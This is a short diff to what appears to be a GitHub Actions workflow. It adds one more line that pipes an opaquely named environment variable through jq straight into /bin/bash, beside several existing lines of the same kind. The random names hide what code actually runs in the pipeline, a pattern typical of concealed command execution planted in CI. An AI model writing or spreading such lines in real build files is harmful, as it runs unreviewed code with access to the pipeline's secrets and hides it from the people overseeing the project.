@@ -28,6 +28,7 @@ jobs:
           echo $dztb119 | jq -r .pynm4658 | /bin/bash
           echo $dktay431 | jq -r .xbta68966 | /bin/bash
           printf '%s' "$mwem32" | jq -r .yu71 | /bin/bash
+          printf '%s' "$fm313" | jq -r .ooo8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
